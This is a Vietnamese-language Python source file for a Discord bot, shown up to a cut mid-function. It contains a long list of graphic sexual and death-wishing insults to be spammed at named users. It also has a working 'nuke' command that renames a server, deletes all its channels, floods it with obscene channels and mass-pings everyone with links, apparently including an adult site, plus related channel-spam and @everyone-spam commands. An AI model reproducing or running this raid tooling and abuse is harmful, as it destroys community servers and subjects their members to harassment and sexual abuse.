import asyncio
import os
import random
import time
import discord
from discord.ext import commands
from groq import Groq
import aiohttp  # Đã thêm import

# ==================== CẤU HÌNH HỆ THỐNG TỐI TÂN ====================
DISCORD_TOKEN = os.getenv("TOKEN")
GROQ_API_KEY = os.getenv("GROQ_API_KEY")

groq_client = Groq(api_key=GROQ_API_KEY) if GROQ_API_KEY else None

# Danh sách ID của Boss Bảo và các đồng minh ủy quyền
BOT_OWNERS = [
    1531882555664629861,  
    1535132569534865490,
    1454570566517260422,
    1536264763427000391,
]

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.moderation = True

# Tiền tố độc quyền l!
bot = commands.Bot(command_prefix="l!", intents=intents, help_command=None)

current_persona_id = 1
last_active_persona_id = 1
bot_stopped = False
is_spamming = False  
spam_task_running = None

# Lưu trữ số dư coin của member: {user_id: coin_balance}
USER_COINS = {}

NUKE_LOG_CHANNELS = {}  # {guild_id: channel_id}

# Lưu trữ yêu cầu nhân cách tùy chỉnh của member từ lệnh l!setpersona
CUSTOM_USER_PERSONAS = {}

CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/63/e8/c6/63e8c69c82b199405fc366ef778addf1.gif"
NUKE_GIF_URL = "https://i.pinimg.com/originals/a3/30/8c/a3308c2100e2526873b3ae8b3ab47b57.gif"
NUKE_AVATAR_URL = "https://i.pinimg.com/736x/06/77/96/0677966604d6b8f84a47fa667260ec4d.jpg"

# ==================== KHO SPAM ĐẦY ĐỦ (209 CÂU CÓ DẤU #) ====================
ROAST_LINES = [
    "# Lồn mẹ mày nát bét như tương, bị địt đến không còn + chảy lênh! {username}",
    "# Đéo biết xấu hổ, lồn mẹ mày thối như cứt + xác chết đầy dòi bọ! {username}",
    "# Thằng óc lồn rộng, mặt giống lỗ đít thối + đầy phân + tinh trùng! {username}",
    "# Mày là đồ bệnh hoạn, chuyên bú cặc chó + ngựa + tự địt lỗ đít! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối rữa! {username}",
    "# Thằng óc phân thối rữa, lồn mẹ mày bị địt đến chảy máu + mủ đặc sưng vù như quả bóng vỡ! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đụ má cái lồn to đùng, chứa đống tinh trùng thối rữa + máu mủ nước! {username}",
    "# Địt mẹ thằng chó đẻ, cặc mày hôi như đống cứt tươi + phân ngựa giữa trời nắng gắt! {username}",
    "# Con đĩ bán dâm, lồn rộng vì bị địt trăm lần + thú + nhét đồ! {username}",
    "# Con đĩ bán thân, lồn rộng vì địt nhiều + thú vật + vật lạ vào! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Con đĩ bán dâm chuyên, lồn rộng vì địt nhiều thú + nhét vật lạ! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú cặc thú + tự địt lỗ đít mình! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân chó tươi! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn của xã hội chuyên bú cặc thú vật! {username}",
    "# Mày chết mẹ mày, đồ rác của xã hội bệnh hoạn chuyên bú cặc thú! {username}",
    "# Lồn to như cái chảo lớn, chứa tinh trùng thối rữa + máu mủ + nước đái thú! {username}",
    "# Đụ má thằng mặt khỉ đột, mẹ mày bú cặc ngựa cả ngày + nuốt tinh trùng sống! {username}",
    "# Chửi tục cái lồn nát, cút xéo thằng chó đẻ bú cặc thú cho đã! {username}",
    "# Đụ má cái lồn to đùng chứa tinh trùng thối + máu mủ + nước đái chó! {username}",
    "# Đéo thèm quan tâm, cái mặt lồn thối của mày đầy nước dãi + phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi chết trong phân thối! {username}",
    "# Lồn mẹ mày rộng như hố phân công cộng ngoài đồng, bị địt đến sưng vù nát như tương đặc + chảy nước nhớt thối! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết 10 ngày + phân! {username}",
    "# Cặc mày teo tóp như con giòi thối rữa trong đống cứt, địt vào lồn già nua thối như xác chết 10 ngày giữa nắng! {username}",
    "# Cặc teo tóp như giòi thối, địt mẹ cái đồ mất dạy óc phân bò! {username}",
    "# Cặc teo như hạt tiêu thối trong phân, địt mẹ cái đồ mất dạy hết mức óc phân! {username}",
    "# Lồn rộng như hồ phân, đụ má thằng khốn kiếp óc cứt thối này! {username}",
    "# Địt mẹ thằng mặt lồn rộng thênh thang như sân vận động chứa phân, óc toàn phân bò khô + nước đái! {username}",
    "# Cặc teo như con giòi thối, địt mẹ cái thằng ngu óc phân bò! {username}",
    "# Đụ má thằng mặt thú vật, mẹ mày bú cặc chó đồng + nuốt tinh trùng! {username}",
    "# Mày chết mẹ mày đi cho sạch đường, lồn to đùng chứa cả xô tinh trùng thối rữa + máu mủ + nước tiểu chó! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Chửi đổng cái lồn thối, cút xéo thằng chó đẻ bú cặc thú vật đi! {username}",
    "# Thằng óc phân thối, mặt giống lỗ đít thối tha đầy phân + tinh trùng! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đéo thèm quan tâm cái lồn thối của mày, bú cặc lợn + chó + tự nhét vào lỗ đít đi! {username}",
    "# Lồn rộng như hồ nước phân ngoài đồng, đụ má thằng khốn nạn óc cứt thối này! {username}",
    "# Mày là đồ mất dạy hết, chuyên bú cặc thú rừng + nuốt sống tinh trùng! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn hình dạng + chảy máu mủ nước nhớt! {username}",
    "# Lồn rộng như sân vận động phân, đụ má thằng óc cứt thối rữa! {username}",
    "# Lồn to như cái ao phân, chứa tinh trùng thối rữa cả xô + máu mủ! {username}",
    "# Đéo thèm nhìn cái mặt lồn thối đầy nước dãi tinh trùng của mày, bú cặc lợn + chó + ngựa đi! {username}",
    "# Đụ má thằng mặt lồn rộng, mẹ mày bú cặc thú + nuốt tinh trùng sống! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn già đến chảy máu + mủ + nước nhớt! {username}",
    "# Con điếm rẻ tiền, chuyên bú cặc chó đêm ngày + nuốt sống tinh trùng! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Thằng óc lồn, mặt mày giống cái lỗ đít thối đầy phân + nước dãi tinh trùng! {username}",
    "# Cặc teo như hạt tiêu đen trong phân, địt mẹ cái đồ ngu si bệnh! {username}",
    "# Đụ má cái đồ rác, lồn to đùng chứa phân + tinh trùng thối rữa + máu mủ! {username}",
    "# Đụ má thằng mặt khỉ, mẹ mày bú cặc thú rừng cả đêm rồi nuốt sống! {username}",
    "# Thằng mặt thú dữ, mẹ mày con đĩ thú vật bú cặc + nuốt tinh trùng! {username}",
    "# Cặc teo tóp xíu xiu như con giòi chết trong cứt, địt mẹ cái thằng ngu si óc phân bò! {username}",
    "# Con đĩ mẹ mày chuyên quỳ gối bú cặc thú vật ngoài đồng rồi nuốt tinh trùng chó tươi + phân lẫn vào! {username}",
    "# Đụ con mẹ chúng mày hết, bú cặc thú vật đi cho rồi + nuốt tinh! {username}",
    "# Địt vào lồn già nua của mẹ mày đến sưng vù + chảy nước nhớt thối + máu mủ lẫn lộn! {username}",
    "# Lồn to như thúng, chứa tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Lồn rộng như cái ao phân ngoài đồng chứa đầy tinh trùng thối, đụ má thằng khốn nạn óc cứt này! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn gì + chảy nước nhớt + máu mủ đặc! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Cặc teo như tiêu đen thối, địt mẹ cái thằng ngu si bệnh hoạn! {username}",
    "# Đéo có tư cách gì, lồn mẹ mày thối như phân bò tươi + xác chết! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình + mủ máu chảy lênh láng! {username}",
    "# Cặc hôi thối như phân, địt vào lồn già nua thối đến sưng chảy! {username}",
    "# Con điếm chuyên bú, cặc thú vật suốt ngày + nuốt sống tinh trùng phân! {username}",
    "# Đéo biết xấu hổ gì, lồn mẹ mày thối như cứt xác chết đầy dòi! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối rữa trong cứt! {username}",
    "# Đụ con mẹ mày nữa, bú cặc thú vật + tinh trùng sống + phân chó! {username}",
    "# Đéo có tư cách, lồn mẹ mày thối như xác chết 15 ngày + đầy dòi! {username}",
    "# Con đĩ thối tha, lồn rộng vì bị địt quá nhiều + thú vật + vật lạ! {username}",
    "# Lồn to như cái thúng chứa đầy tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Mày chết cho sạch, đồ bệnh hoạn chuyên bú thú + tự địt lỗ đít! {username}",
    "# Cặc hôi thối như cứt chó tươi giữa nắng, địt vào lồn già nua đến sưng! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân + nước đái! {username}",
    "# Lồn rộng như hồ nước phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Đụ con mẹ mày lần nữa, bú cặc thú + nuốt tinh trùng sống + phân! {username}",
    "# Óc cứt thối hoắc, lồn mẹ mày sưng vù vì địt + nhét vật lạ + thú! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Đéo thèm quan tâm đến cái lồn thối + đầy nước dãi tinh trùng + phân của mày! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình dạng + chảy máu mủ! {username}",
    "# Chửi đổng cái lồn nát, cút mẹ mày bú cặc chó đi cho thỏa mãn! {username}",
    "# Thằng mặt lờ đờ, mẹ mày con đĩ chó bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Đéo thèm nhìn mặt, cái lồn thối hoắc đầy nước dãi + phân của mày! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú thú vật + tự địt! {username}",
    "# Đụ con đĩ già nua thối như xác chết phân hủy, cặc mày hôi như đống cứt chó + phân ngựa phơi nắng! {username}",
    "# Mày là đồ mất dạy hết mức, chuyên bú cặc thú rừng + nuốt sống tinh trùng + phân! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối trong phân! {username}",
    "# Địt mẹ thằng chó cái đẻ, cặc teo tóp xíu như giòi trong phân! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú vật chuyên bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Mày là đồ vô học, chuyên bú cặc ngựa + chó + lợn + nuốt sống! {username}",
    "# Cặc nhỏ như đậu thối, địt vào lồn già đến sưng vù + chảy máu mủ! {username}",
    "# Cặc nhỏ xíu như kiến, địt vào lồn già chảy máu mủ + nước nhớt! {username}",
    "# Đụ con đĩ già nua, cặc mày hôi như phân bò phơi nắng + xác chết thối! {username}",
    "# Cặc nhỏ như kiến chết, địt vào lồn già đến sưng + chảy máu mủ nhớt! {username}",
    "# Thằng mặt lờ, mẹ mày là con đĩ thú vật bú cặc ngựa + chó ngoài đường! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + nước dãi tinh trùng thú! {username}",
    "# Địt vào mồm thối hoắc, nuốt tinh trùng chó + phân tươi + nước đái! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú bú cặc + nuốt tinh trùng! {username}",
    "# Đụ con đĩ già thối tha, cặc hôi như phân bò phơi + xác chết thối! {username}",
    "# Óc phân bò khô thối, lồn mẹ mày sưng vù vì bị địt + nhét cặc thú + vật lạ! {username}",
    "# Địt mẹ thằng chó cái, cặc teo tóp xíu như giòi chết trong phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi thối rữa trong đống cứt! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn gì + chảy nước máu mủ lênh láng! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến nát + chảy mủ máu nước nhớt! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn chuyên bú cặc thú của xã hội! {username}",
    "# Đụ má cái đồ mất dạy hết mức, mẹ mày bú cặc thú rừng rồi nuốt tinh trùng sống + phân chó! {username}",
    "# Đụ má thằng mặt thú, mẹ mày bú cặc ngựa + chó ngoài đồng rồi nuốt sống! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + tinh trùng thú! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn già đến chảy máu + mủ + nước nhớt thối! {username}",
    "# Địt vào mồm mày, bắt nuốt tinh trùng thối + phân chó tươi + nước đái lẫn! {username}",
    "# Đụ con mẹ mày lần nữa nữa, bú cặc thú vật + nuốt tinh trùng sống! {username}",
    "# Óc cứt thối của mày, đụ con đĩ mẹ mày lần nữa rồi bắt nó quỳ bú cặc chó ngoài đường! {username}",
    "# Cặc hôi thối như cứt tươi, địt vào lồn già thối hoắc đến sưng vù! {username}",
    "# Mày chết mẹ mày đi ngay, đồ rác rưởi hết mức chuyên bú cặc thú! {username}",
    "# Chửi đổng cái lồn, cút xéo đi thằng chó đẻ bú cặc thú vật! {username}",
    "# Cặc hôi thối như cứt chó tươi, địt vào lồn già đến sưng chảy mủ! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến không còn gì + chảy nước máu! {username}",
    "# Cặc nhỏ xíu như đậu thối, địt vào lồn già chảy máu + mủ nhớt! {username}",
    "# Địt vào mồm thối hoắc của mày rồi bắt nuốt tinh trùng chó tươi + phân + nước đái! {username}",
    "# Con đĩ thối tha hết, lồn rộng vì bị địt cả trăm lần + thú vật! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết thối + phân bò! {username}",
    "# Con đĩ thối tha hết mức, lồn rộng thênh thang như biển phân + tinh trùng thối rữa! {username}",
    "# Đụ má cái lồn thối hoắc nát bét chảy mủ máu của mẹ mày, quỳ xuống bú cặc chó + ngựa + lợn + nuốt tinh trùng sống cả đống! {username}",
    "# Đéo biết xấu hổ chút nào, lồn mẹ mày thối như xác chết phân hủy đầy dòi bọ! {username}",
    "# Thằng mặt thú vật hoang dã, lồn mẹ mày thối hoắc như xác chết phân hủy giữa mùa hè oi bức! {username}"
]

# ==================== KHO 50 CÂU LÀM VIỆC (WORK) CHO MEMBER ====================
WORK_SCENARIOS = [
    "bạn đã cặm cụi fix một đống bug code lỗi sản phẩm cho Boss Bảo và nhận được",
    "bạn vừa thức trắng đêm để thiết kế giao diện đồ họa siêu cấp độc quyền cho Boss Bảo và kiếm về",
    "bạn đi lụm ve chai phế liệu công nghệ cao ngoài hành lang căn cứ và bán được",
    "bạn tham gia sự kiện hack bảo mật hệ thống vũ trụ ảo và giật giải thưởng lớn trị giá",
    "bạn làm chân sai vật vạ pha trà sữa trân châu đường đen dâng lên Boss Bảo và được thưởng nóng",
    "bạn viết một đoạn văn ca tụng vẻ đẹp tuyệt trần của Boss Bảo và được hệ thống ban phát",
    "bạn dọn dẹp sạch sẽ phòng làm việc tối mật của Boss Bảo và nhặt được phong bì rơi",
    "bạn train thành công một con AI trợ lý ảo chuyên nghiệp cho Boss Bảo và nhận hoa hồng",
    "bạn đi cấu vé số vận mệnh vũ trụ may mắn và trúng độc đắc mang về",
    "bạn nhận nhiệm vụ bảo vệ cổng thành không gian và đánh bại quái vật boss phụ, nhận thưởng",
    "bạn phụ bếp nấu bữa tối hoàng gia cực kỳ thịnh soạn theo đúng gu của Boss Bảo, nhận ngay",
    "bạn biên soạn thành công 500 dòng tài liệu hướng dẫn tối tân cho tân thủ, nhận lương cứng",
    "bạn đi câu cá mập không gian tại ngân hà và đem bán lấy tiền thưởng",
    "bạn hoàn thành bài kiểm tra đạo đức phò tá Boss Bảo xuất sắc tuyệt đối, nhận phần thưởng",
    "bạn tham gia đại hội tỷ thí lập trình viên xuất sắc nhất server và giành cúp vàng kèm theo",
    "bạn đi khai thác quặng tinh thể hồng ngọc quý hiếm dưới lòng đất sâu thẳm, thu về",
    "bạn làm shipper giao tài liệu mật xuyên không gian cho Boss Bảo đúng hạn, nhận tiền công",
    "bạn biểu diễn tấu hài múa lửa phục vụ giải trí cho toàn bộ căn cứ của Boss Bảo, nhận thù lao",
    "bạn tinh chỉnh lại toàn bộ băng thông đường truyền mạng siêu tốc, nhận phần thưởng tối ưu",
    "bạn đi tìm kiếm các mảnh ghép kho báu huyền thoại bị thất lạc hàng ngàn năm, đổi được",
    "bạn làm trợ giảng lớp học huấn luyện tân binh bot discord của Boss Bảo, nhận học bổng",
    "bạn quét dọn kho lưu trữ dữ liệu cũ rích và thu gom các linh kiện bán cổ vật đổi lấy",
    "bạn tham gia trò chơi trốn tìm không gian với các bot khác và chiến thắng ngoạn mục,",
    "bạn viết hộ một bài thơ tình lãng mạn siêu ngọt ngào dâng lên Boss Bảo, nhận lộc lớn",
    "bạn đi săn bắt các con bug lỗi phần mềm cứng đầu trốn trong hệ thống, nhận tiền thưởng nóng",
    "bạn nhận làm bảo kê quán cà phê ảo của server trong một tuần lễ, thu về lương khủng",
    "bạn sáng tác một bản nhạc chuông điện thoại độc quyền cực hay cho Boss Bảo, nhận hoa hồng",
    "bạn đi trồng cây hoa hướng dương hồng thần kỳ khắp các khu vườn server, thu hoạch được",
    "bạn trực tổng đài giải đáp thắc mắc không ngừng nghỉ cho các thành viên mới, nhận lương tuần",
    "bạn đi làm từ thiện phát lương thực ảo cho các tài khoản nghèo khổ trong server, được trả công",
    "bạn tinh chỉnh bộ lọc ngôn từ độc hại giúp căn cứ trong sạch hơn, nhận phần thưởng chuyên cần",
    "bạn tham gia thử thách ăn 100 tô mì cay không gian khổng lồ và chiến thắng, nhận giải thưởng",
    "bạn thiết kế bộ sticker hình mèo con dễ thương thả thính tặng Boss Bảo, nhận thưởng lớn",
    "bạn đi thám hiểm vùng đất hoang vu chưa từng có ai đặt chân tới và khai phá tài nguyên",
    "bạn làm trọng tài công tâm cho các trận chiến minigame giữa các thành viên, nhận thù lao",
    "bạn sáng chế ra một loại thuốc bổ trợ năng lượng siêu tốc cho bot, bán bản quyền thu về",
    "bạn nhận nhiệm vụ bảo trì toàn bộ hệ thống máy chủ phụ trong đêm, nhận phụ cấp đêm",
    "bạn viết kịch bản cho một bộ phim điện ảnh ngắn về hành trình phục vụ Boss Bảo, nhận nhuận bút",
    "bạn đi gom nhặt những giọt sương mai tinh khiết nhất vũ trụ dâng lên Boss Bảo, nhận lộc",
    "bạn tham gia cuộc thi thiết kế biểu tượng cảm xúc độc lạ cho server và giành giải thưởng",
    "bạn hoàn thành xuất sắc ca trực gác cổng không gian suốt 24 tiếng đồng hồ, nhận thưởng",
    "bạn đi nhặt các đồng coin rơi rớt dọc theo các kênh chat cũ kỹ của server, tổng cộng nhặt được",
    "bạn phụ trách việc trang trí lộng lẫy toàn bộ kênh thông báo chính bằng sắc hồng, nhận lương",
    "bạn tham gia phiên đấu giá vật phẩm quý hiếm và buôn bán thành công một món đồ, lãi khủng",
    "bạn giải mã thành công mật mã cổ đại do Boss Bảo đặt ra để thử thách, nhận phần thưởng",
    "bạn đi làm phục vụ tại nhà hàng ảo cao cấp nhất do Boss Bảo quản lý, nhận tiền típ",
    "bạn chế tạo thành công một cỗ máy thời gian mini chạy bằng năng lượng tình yêu, bán được",
    "bạn tham gia dọn dẹp rác thải điện tử kỹ thuật số tại các ổ cứng hỏng, thu gom được",
    "bạn làm hướng dẫn viên du lịch không gian dẫn đoàn tân binh tham quan server, nhận thù lao",
    "bạn hoàn thành trọn vẹn chuỗi 50 nhiệm vụ tối thượng phục vụ Boss Bảo và nhận phần thưởng"
]

# ==================== HỆ THỐNG NUKE SERVER TỐI CAO ====================
NUKE_CHANNEL_NAMES = [
    "NUKE BY LUNAL KINGDOM",
    "NUKE BY BẢO ĐẸP ZAI",
    "NUKE BY BOT NUKE ON TOP",
    "DETROYED BY BOT NUKE EZ TOP"
]

def is_bot_owner():
    async def predicate(ctx):
        return ctx.author.id in BOT_OWNERS
    return commands.check(predicate)

# ==================== LỆNH NUKE SERVER TỐI ƯU TỐC ĐỘ ====================
@bot.command(name="nuke")
@is_bot_owner()
async def nuke_server(ctx):
    """Lệnh nuke server: Xóa tất cả kênh và tạo 100 kênh mới với tên tục tĩu, sau đó spam nội dung yêu cầu"""
    try:
        confirm_embed = discord.Embed(
            title="⚠️ XÁC NHẬN LỆNH NUKE SERVER ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ:\n"
                f"• Xóa **TOÀN BỘ** kênh trong server (text/voice/categories)\n"
                f"• Tạo **100 kênh mới** với tên tục tĩu\n"
                f"• Spam thông điệp nuke trong mỗi kênh\n"
                f"• Đổi tên server thành **DEAD SEVER**\n"
                f"• Đổi avatar server\n\n"
                f"🔹 **Gõ l!confirmnuke để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel

        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "l!confirmnuke":
                await ctx.send("❌ Lệnh nuke đã bị hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian chờ. Lệnh nuke đã bị hủy bỏ.")
            return

        # 🔥 GỬI LOG BẮT ĐẦU (nếu có kênh log)
        if ctx.guild.id in NUKE_LOG_CHANNELS:
            log_channel = bot.get_channel(NUKE_LOG_CHANNELS[ctx.guild.id])
            if log_channel:
                start_embed = discord.Embed(
                    title="🔥 NUKE BẮT ĐẦU",
                    description=f"**Server:** {ctx.guild.name}\n**Người thực hiện:** {ctx.author.mention}\n**Thời gian:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
                    color=0xFF0000,
                    timestamp=discord.utils.utcnow()
                )
                await log_channel.send(embed=start_embed)

        nuke_embed = discord.Embed(
            title="🚀 KÍCH HOẠT GIAI ĐOẠN NUKE SERVER 🚀",
            description="🔥 **Đang thực hiện phá hủy toàn bộ server...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=nuke_embed)

        # ⚡ ĐỔI TÊN SERVER VÀ AVATAR TRƯỚC KHI XÓA KÊNH
        try:
            await ctx.guild.edit(name="DEAD SEVER")
            async with aiohttp.ClientSession() as session:
                async with session.get(NUKE_AVATAR_URL) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        await ctx.guild.edit(icon=image_data)
                        print("[NUKE] Đã đổi avatar server thành công.")
                    else:
                        print(f"[NUKE] Không tải được avatar, status code: {resp.status}")
        except Exception as e:
            print(f"[NUKE] Lỗi khi đổi tên/avatar: {e}")

        # ⚡ XÓA TẤT CẢ KÊNH (tốc độ 5 kênh/giây)
        delete_tasks = []
        for channel in ctx.guild.channels:
            delete_tasks.append(channel.delete())
            if len(delete_tasks) >= 5:  # batch 5 kênh
                await asyncio.gather(*delete_tasks, return_exceptions=True)
                delete_tasks.clear()
                await asyncio.sleep(0.1)  # chống rate limit
        if delete_tasks:
            await asyncio.gather(*delete_tasks, return_exceptions=True)

        # ⚡ TẠO 100 KÊNH MỚI (tốc độ 20 kênh/giây)
        create_tasks = []
        for i in range(100):
            channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
            create_tasks.append(ctx.guild.create_text_channel(name=channel_name))
            if len(create_tasks) >= 20:  # batch 20 kênh
                await asyncio.gather(*create_tasks, return_exceptions=True)
                create_tasks.clear()
                await asyncio.sleep(0.1)
        if create_tasks:
            await asyncio.gather(*create_tasks, return_exceptions=True)

        # ⚡ SPAM CÂU NUKE TRONG MỖI KÊNH (tốc độ 50 tin/giây, 5 kênh mỗi giây)
        spam_content = (
            "# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            '"link support 1: https://xnhau.pics/"\n'
            ' "link support 2: https://discord.gg/hSdEUZD6Jp"'
        )
        all_channels = ctx.guild.text_channels
        batch_size = 5  # xử lý 5 kênh song song
        for i in range(0, len(all_channels), batch_size):
            batch = all_channels[i:i+batch_size]
            tasks = []
            for channel in batch:
                async def send_messages(channel=channel):
                    for _ in range(10):
                        try:
                            embed = discord.Embed()
                            embed.set_image(url=NUKE_GIF_URL)
                            await channel.send(spam_content, embed=embed)
                        except:
                            break
                        await asyncio.sleep(0.02)  # 0.02s = 50 tin/giây
                tasks.append(send_messages())
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.1)  # chống rate limit

        # Hoàn thành
        complete_embed = discord.Embed(
            title="💀 NUKE SERVER HOÀN TẤT 💀",
            description=(
                f"🔥 **Server đã bị phá hủy hoàn toàn theo lệnh của Boss Bảo!** 🔥\n\n"
                f"• **Đã đổi tên:** DEAD SEVER\n"
                f"• **Đã đổi avatar:** Avatar mới\n"
                f"• **Đã xóa:** Tất cả kênh gốc\n"
                f"• **Đã tạo:** 100 kênh mới\n"
                f"• **Đã spam:** Thông điệp nuke trong mỗi kênh\n\n"
                f"💀 **Server này đã trở thành địa ngục GENIUS AI 4.0!** 💀"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=complete_embed)

        # ✅ GỬI LOG HOÀN THÀNH (nếu có kênh log)
        if ctx.guild.id in NUKE_LOG_CHANNELS:
            log_channel = bot.get_channel(NUKE_LOG_CHANNELS[ctx.guild.id])
            if log_channel:
                end_embed = discord.Embed(
                    title="✅ NUKE HOÀN TẤT",
                    description=f"**Server:** {ctx.guild.name}\n**Thời gian hoàn thành:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
                    color=0x00FF00,
                    timestamp=discord.utils.utcnow()
                )
                await log_channel.send(embed=end_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI THỰC HIỆN NUKE",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@nuke_server.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi khi thực hiện lệnh nuke: {str(error)}")

# ==================== LỆNH TẠO KÊNH SPAM TỰ ĐỘNG ====================
@bot.command(name="spamchannels")
@is_bot_owner()
async def spam_channels(ctx, amount: int = 100):
    try:
        if amount > 200:
            amount = 200

        embed = discord.Embed(
            title="🚀 KÍCH HOẠT TẠO KÊNH SPAM",
            description=f"🔥 **Đang tạo {amount} kênh với tên tục tĩu...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)

        for i in range(amount):
            try:
                channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
                await ctx.guild.create_text_channel(name=channel_name)
                await asyncio.sleep(0.5)
            except:
                continue

        complete_embed = discord.Embed(
            title="✅ TẠO KÊNH HOÀN TẤT",
            description=f"🎉 **Đã tạo thành công {amount} kênh spam với tên tục tĩu!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI KHI TẠO KÊNH",
            description=f"🚨 **Đã xảy ra lỗi:** {str(e)}",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@spam_channels.error
async def spam_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")

# ==================== LỆNH SPAM @EVERYONE TRONG TẤT CẢ KÊNH ====================
@bot.command(name="spameveryone")
@is_bot_owner()
async def spam_everyone(ctx):
    try:
        spam_content = (
            "# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            '"link support 1: https://xnhau.pics/"\n'
            ' "link support 2: https://discord.gg/hSdEUZD6Jp"'
        )

        embed = discord.Embed(
            title="🚀 KÍCH HOẠT SPAM @EVERYONE",
            description="🔥 **Đang spam @everyone trong tất cả kênh...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)

        for channel in ctx.guild.text_channels:
            try:
                for _ in range(10):
                    embed = discord.Embed()
                    embed.set_image(url=NUKE_GIF_URL)
                    await channel.send(spam_content, embed=embed)
                    await asyncio.sleep(0.1)
            except:
                continue

        complete_embed = discord.Embed(
            title="✅ SPAM @EVERYONE HOÀN TẤT",
